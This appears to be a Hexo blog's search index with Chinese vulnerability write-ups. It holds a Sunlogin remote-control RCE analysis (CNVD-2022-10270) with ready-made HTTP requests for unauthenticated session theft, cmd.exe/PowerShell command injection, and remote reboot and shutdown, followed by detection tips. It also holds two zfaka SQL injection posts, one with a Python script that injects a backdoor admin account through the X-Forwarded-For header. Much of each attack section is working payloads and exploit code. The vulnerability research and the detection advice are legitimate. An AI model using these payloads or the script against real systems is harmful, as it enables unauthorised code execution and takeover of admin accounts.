<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>向日葵远程命令执行漏洞分析</title>
      <link href="/p/b58b.html"/>
      <url>/p/b58b.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-相关报道"><a href="#0x00-相关报道" class="headerlink" title="0x00 相关报道"></a>0x00 相关报道</h1><blockquote><ul><li>CNVD： <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></li><li>向日葵团队： <a href="https://www.oray.com/announcements/affiche/?aid=774">https://www.oray.com/announcements/affiche/?aid=774</a></li></ul></blockquote><h1 id="0x01-程序详情"><a href="#0x01-程序详情" class="headerlink" title="0x01 程序详情"></a>0x01 程序详情</h1><p>测试程序版本为<code>11.0.0.33162</code>，官网目前只开放12.5版本，但是可以遍历下载ID进行下载<br><img src="/images/Pasted%20image%2020220216144105.png"><br><img src="/images/Pasted%20image%2020220216144048.png"><br>向日葵为C++编写，使用UPX3.X加壳故此分析前需要进行脱壳处理（github上有UPX项目，可以直接脱）<br><img src="/images/Pasted%20image%2020220216112036.png"><br><img src="/images/Pasted%20image%2020220216112100.png"><br>此外向日葵在启动的时候会随机启动一个4W+高位端口并记录在日志中，具体在<code>sub_140E0AAE8</code>可看到<br><img src="/images/Pasted%20image%2020220216143340.png"></p><h1 id="0x02-根据日志找session"><a href="#0x02-根据日志找session" class="headerlink" title="0x02 根据日志找session"></a>0x02 根据日志找session</h1><p>社会孙在视频中有一段疑似session的字符串<br><img src="/images/Pasted%20image%2020220216112203.png"><br>根据这段疑似<code>session</code>的关键字在向日葵一次正常远程的日志中找到了关键字<code>CID</code><br><img src="/images/Pasted%20image%2020220216112348.png"><br>随后载入IDA，对CID关键字进行搜索<br><img src="/images/Pasted%20image%2020220216112427.png"><br>找到3个函数存在CID关键字字符串<br><code>sub_140E20938</code>、<code>sub_140E1C954</code>、<code>sub_140E1A1F4</code><br>往上跟发现分别对应接口<br><code>/cgi-bin/rpc</code>和<code>/cgi-bin/login.cgi </code><br><img src="/images/Pasted%20image%2020220216112715.png"><br>其中在函数<code>sub_140E1C954</code>对应接口功能<code>/cgi-bin/rpc</code>中，传入如下参数即可在未授权的情况下获取到有效session</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/rpc HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49670</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">action=verify-haras</span><br></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020220216112814.png"><br>在知道被控端的验证码和识别码的情况下传入如下参数可获取到session<br><img src="/images/Pasted%20image%2020220216112908.png"><br>在知道主机的帐密的情况下通过<code>/cgi-bin/login.cgi </code>接口传入如下参数可获取到session并返回设备的公网、内网地址等信息，该接口同时可用作暴力破解<br><img src="/images/Pasted%20image%2020220216113029.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/login.cgi HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49670</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">act=login&amp;username=admin&amp;password=admin&amp;hostname=a</span><br></pre></td></tr></table></figure><h1 id="0x03-RCE-trick"><a href="#0x03-RCE-trick" class="headerlink" title="0x03 RCE-trick"></a>0x03 RCE-trick</h1><p>assist参数拼接导致<br><img src="/images/Pasted%20image%2020220216130119.png"><br><img src="/images/Pasted%20image%2020220216130143.png"><br><img src="/images/Pasted%20image%2020220216142439.png"><br>我这边没有成功，有思路的师傅可以交流下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /assist HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49496</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</span><br><span class="line">connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">fastcode=888888+||+&quot;aaa&quot;+%26%26+||+c:\windows\system32\cmd.exe+/c+whoami+&gt;+C:\\Users\\__SUNLOGIN_USER__\\1.txt</span><br></pre></td></tr></table></figure><h1 id="0x04-RCE1"><a href="#0x04-RCE1" class="headerlink" title="0x04 RCE1"></a>0x04 RCE1</h1><p><img src="/images/Pasted%20image%2020220216133549.png"><br>ping命令拼接导致</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /check?cmd=ping%20127.0.0.1%20|%20cmd%20/c%20echo%20whoami%00 HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49496</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</span><br><span class="line">connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+net+user HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49496</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</span><br><span class="line">connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /check?cmd=ping../../../SysWOW64/cmd.exe+/c+net+user HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49496</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</span><br><span class="line">connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05-远程重启"><a href="#0x05-远程重启" class="headerlink" title="0x05 远程重启"></a>0x05 远程重启</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /control.cgi?__mode=control&amp;act=reboot HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49934</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=lzKrTiUH5Z7GagluSTocMmHBAF9Pxz75</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x06-远程关机"><a href="#0x06-远程关机" class="headerlink" title="0x06 远程关机"></a>0x06 远程关机</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /control.cgi?__mode=control&amp;act=shutdown HTTP/1.1</span><br><span class="line">Host: 10.100.100.5:49934</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=lzKrTiUH5Z7GagluSTocMmHBAF9Pxz75</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x07指纹信息"><a href="#0x07指纹信息" class="headerlink" title="0x07指纹信息"></a>0x07指纹信息</h1><p>低版本向日葵特征<code> body=&quot;Verification failure&quot; &amp;&amp; body=&quot;false&quot; &amp;&amp; header=&quot;Cache-Control: no-cache&quot; &amp;&amp; header=&quot;Content-Length: 46&quot; &amp;&amp; header=&quot;Content-Type: application/json&quot;</code></p><h1 id="0x08检测手段"><a href="#0x08检测手段" class="headerlink" title="0x08检测手段"></a>0x08检测手段</h1><h2 id="主机层"><a href="#主机层" class="headerlink" title="主机层"></a>主机层</h2><p>主机层可通过检测向日葵连接日志中是否存在<code>ping</code>、<code>../</code>等关键字进行检查是否被入侵<br><img src="/images/Pasted%20image%2020220217091100.png"><br>帐号暴力破解可通过检查事件查看器中的类似日志进行排查<br><img src="/images/Pasted%20image%2020220217091313.png"><br><img src="/images/Pasted%20image%2020220217091326.png"><br><img src="/images/Pasted%20image%2020220217091352.png"></p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ol><li>检查高位端口流量中是否存在向日葵指纹特征</li><li>检查流量中是否存在类似<code>ping../</code>、<code>nslookup../</code>关键字<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>向日葵还有很多接口有兴趣的师傅可以继续跟进看看，我先卸载了。。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login</span><br><span class="line">express_login</span><br><span class="line">cgi-bin/login.cgi</span><br><span class="line">log</span><br><span class="line">cgi-bin/rpc</span><br><span class="line">transfer</span><br><span class="line">cloudconfig</span><br><span class="line">getfastcode</span><br><span class="line">assist</span><br><span class="line">projection</span><br><span class="line">getaddress</span><br><span class="line">sunlogin-tools</span><br><span class="line">control</span><br><span class="line">desktop.list</span><br><span class="line">check</span><br><span class="line">micro-live/enable</span><br><span class="line">screenshots</span><br><span class="line">httpfile</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul><li>2022-2-14 监测到国内安全团队发布向日葵远程命令执行演示视频</li><li>2022-2-15 CNVD发布漏洞通告（CNVD-2022-10270）</li><li>2022-2-16 国内安全公司发布检测POC</li><li>2022-2-16 分析报告发布</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zfaka第二处注入</title>
      <link href="/p/a6dc.html"/>
      <url>/p/a6dc.html</url>
      
        <content type="html"><![CDATA[<p><code>zfaka</code>在安装的时候会新建一个测试帐号<code>43036456@qq.com</code>，密码<code>123456</code><img src="/images/image-20210831102548386.png" alt="image-20210831102548386"></p><p><img src="/images/image-20210831102729757.png" alt="image-20210831102729757"></p><p>在文件<code>application/modules/Member/controllers/Profiles.php</code>，<code>profilesajaxAction</code>方法第53行附近存在注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">profilesajaxAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;login==<span class="literal">FALSE</span> AND !<span class="variable language_">$this</span>-&gt;userid) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1000</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;请登录&#x27;</span>);</span><br><span class="line"><span class="title class_">Helper</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;nickname&#x27;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$qq</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;qq&#x27;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$tag</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;tag&#x27;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$csrf_token</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;csrf_token&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$nickname</span> AND <span class="variable">$csrf_token</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">VerifyCsrfToken</span>(<span class="variable">$csrf_token</span>)) &#123;</span><br><span class="line"><span class="variable">$nickname_string</span> = <span class="keyword">new</span> \Safe\<span class="title function_ invoke__">MyString</span>(<span class="variable">$nickname</span>);</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$nickname_string</span>-&gt;<span class="title function_ invoke__">trimall</span>()-&gt;<span class="title function_ invoke__">getValue</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$qq_string</span> = <span class="keyword">new</span> \Safe\<span class="title function_ invoke__">MyString</span>(<span class="variable">$qq</span>);</span><br><span class="line"><span class="variable">$qq</span> = <span class="variable">$qq_string</span>-&gt;<span class="title function_ invoke__">trimall</span>()-&gt;<span class="title function_ invoke__">getValue</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;m_user-&gt;<span class="title function_ invoke__">UpdateByID</span>(<span class="keyword">array</span>(<span class="string">&#x27;nickname&#x27;</span>=&gt;<span class="variable">$nickname</span>,<span class="string">&#x27;qq&#x27;</span>=&gt;<span class="variable">$qq</span>,<span class="string">&#x27;tag&#x27;</span>=&gt;<span class="variable">$tag</span>),<span class="variable language_">$this</span>-&gt;userid);<span class="comment">//注入点</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;更新成功&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1001</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;页面超时，请刷新页面后重试!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1000</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;丢失参数&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Helper</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /member/profiles/profilesajax HTTP/1.1</span><br><span class="line">Host: 10.100.100.139:84</span><br><span class="line">Content-Length: 395</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://10.100.100.139:84</span><br><span class="line">Referer: http://10.100.100.139:84/member/profiles</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=v8cune5mggdgu7dp036q722c0q</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">nickname=666777*&amp;qq=43036456&amp;tag=%E8%B5%84%E6%96%99%E7%A9%BA%E7%99%BD%E6%98%AF%E5%A4%A7%E5%B8%85%E9%94%85&amp;csrf_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC96bGtiLm5ldCIsImF1ZCI6IlJQQyIsImV4cCI6MTYzMDM3OTU5NX0.EyrvVuN4mcHL_h8YXcKoq9XJ0H_cmcD5YainH2XPsCcMMdFZYAfPZxqzSc1ohkbiYxXeVcuGa0Rq_Ea0gyW_1qQuF0pVrjeOz4bRSTr6fI-dHn_wp4k4EKTgCAPpaVmqBgzAdmpyKuar_jlX-04vPfV1SPKe2hqojRjO9LGxBfw</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210831110653762.png" alt="image-20210831110653762"></p><p>需要注意的是<code>csrf_token</code>会过期</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zfaka注入分析</title>
      <link href="/p/1129.html"/>
      <url>/p/1129.html</url>
      
        <content type="html"><![CDATA[<p> <code>zfaka</code>官方于7月11日发布了补丁，修复了一处<code>sql</code>注入，简单记录下分析过程</p><h1 id="0x01补丁"><a href="#0x01补丁" class="headerlink" title="0x01补丁"></a>0x01补丁</h1><p>补丁显示修改了<code>application/function/F_Network.php</code>文件，该文件的<code>getClientIP</code>函数使用了网络上通用遍历<code>XFF</code>等<code>header</code>头获取真实IP的方法,但是获取完<code>XFF</code>后根据<code>,</code>截断获取第一个值后直接返回IP</p><p><img src="/images/image-20210728085410832.png" alt="image-20210728085410832"></p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>全局搜索下调用该函数的位置，发现前台的<code>application/modules/Product/controllers/Order.php</code>文件和<code>application/modules/Product/controllers/Query.php</code>调用了该函数，对应功能为下单和订单查询功能</p><p><img src="/images/image-20210728085907920.png" alt="image-20210728085907920"></p><p>进一步确认后为<code>application/modules/Product/controllers/Query.php</code>第151行为存在漏洞的代码</p><h1 id="0x03-动态调试"><a href="#0x03-动态调试" class="headerlink" title="0x03 动态调试"></a>0x03 动态调试</h1><p>对151行下断点进行调试</p><p><img src="/images/image-20210728090043966.png" alt="image-20210728090043966"></p><p>找到对应功能</p><p><img src="/images/image-20210728091246070.png" alt="image-20210728091246070"></p><p>成功断下，单步跟入</p><p><img src="/images/image-20210728091307932.png" alt="image-20210728091307932"></p><p>发现在<code>application/library/Core/Model.php</code>中的<code>Where</code>方法对<code>orderid</code> 、<code>isdelete</code> 、 <code>ip</code> 直接进行了拼接</p><p><img src="/images/image-20210728091614986.png" alt="image-20210728091614986"></p><p>并在<code>select</code>方法中调用<code>generateSQL</code>方法进行拼接生成<code>sql</code>语句并执行</p><p><img src="/images/image-20210728091834330.png" alt="image-20210728091834330"></p><p><img src="/images/image-20210728091932567.png" alt="image-20210728091932567"></p><p>用<code>burpsuite</code>修改<code>XFF</code>发包进行测试</p><p><img src="/images/image-20210728093635762.png" alt="image-20210728093635762"></p><p>命中断点后获取到的IP为<code>&quot;or sleep(2)-- x</code>执行的<code>sql</code>语句变为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `t_order` <span class="keyword">WHERE</span> `orderid` <span class="operator">=</span> &quot;xxxxxx&quot; <span class="keyword">AND</span> `isdelete` <span class="operator">=</span> &quot;0&quot; <span class="keyword">AND</span> `ip` <span class="operator">=</span> &quot;&quot;<span class="keyword">or</span> sleep(<span class="number">2</span>)<span class="comment">-- x&quot; AND addtime&gt;=1624844145 ORDER BY `id` desc</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20210728093649577.png" alt="image-20210728093649577"></p><p><img src="/images/image-20210728093738524.png" alt="image-20210728093738524"></p><p>去掉<code>debug_session</code>发包测试，延时3秒</p><p><img src="/images/image-20210728093942716.png" alt="image-20210728093942716"></p><p>该处还支持堆叠注入，因此可以执行包括不限于添加管理、会员等功能。</p><p>半自动化脚本关键代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insertData</span>(<span class="params">url</span>):</span><br><span class="line">    vul_url=<span class="string">&#x27;product/query/ajax/&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session= requests.Session()</span><br><span class="line">        res=session.get(url,verify=<span class="literal">False</span>)</span><br><span class="line">        phpsessionid=res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">        searchObj = re.search( <span class="string">r&#x27;var TOKEN = &quot;.*&quot;;&#x27;</span>, res.text, re.M|re.I)</span><br><span class="line">        <span class="keyword">if</span> searchObj:</span><br><span class="line">            CSRF_TOKEN=searchObj.group(<span class="number">0</span>).replace(<span class="string">&#x27;var TOKEN = &quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&quot;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;获取CSRF_TOKEN失败&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        data[<span class="string">&#x27;zlkbmethod&#x27;</span>]=<span class="string">&#x27;orderid&#x27;</span></span><br><span class="line">        data[<span class="string">&#x27;csrf_token&#x27;</span>]=CSRF_TOKEN</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;浏览器访问&#123;URL&#125;，将[Cookie: &#123;phpsessionid&#125;]替换至浏览器Cookie中,获取验证码并输入至脚本中。&#x27;</span>.<span class="built_in">format</span>(phpsessionid=phpsessionid,URL=url+<span class="string">&#x27;product/query/?zlkbmethod=orderid&#x27;</span>).replace(<span class="string">&#x27;; path=/&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        data[<span class="string">&#x27;vercode&#x27;</span>]=<span class="built_in">input</span>(<span class="string">&#x27;验证码:&#x27;</span>)</span><br><span class="line">        headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>]=<span class="string">&#x27;1111&quot;;insert into t_admin_user(`id`)  values (\&#x27;&#123;RandomNum&#125;\&#x27;);UPDATE t_admin_user SET `email`=\&#x27;&#123;EMAIL&#125;\&#x27; WHERE id = \&#x27;&#123;RandomNum&#125;\&#x27; ;UPDATE t_admin_user SET `password`=\&#x27;76b1807fc1c914f15588520b0833fbc3\&#x27; WHERE id = \&#x27;&#123;RandomNum&#125;\&#x27;;UPDATE t_admin_user SET `secret`=\&#x27;78e055\&#x27; WHERE id = \&#x27;&#123;RandomNum&#125;\&#x27;#&#x27;</span>.<span class="built_in">format</span>(RandomNum=RNDNUM,EMAIL=EMAIL.lower())</span><br><span class="line">        res=session.post(url+vul_url,data=data,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;1005&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;exploit success, account add success\nuse &#123;EMAIL&#125; 123456 to login &#123;URL&#125;&#x27;</span>.<span class="built_in">format</span>(EMAIL=EMAIL.lower(),URL=url+<span class="string">&#x27;/admin&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;exploit failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Network Error.&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一些CS上线手法</title>
      <link href="/p/2e3.html"/>
      <url>/p/2e3.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="5a91b033d4bed42cca8bd93528e986ade664a50724234c94c601063d0b57ea8d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>科迈RAS 多个安全漏洞</title>
      <link href="/p/87.html"/>
      <url>/p/87.html</url>
      
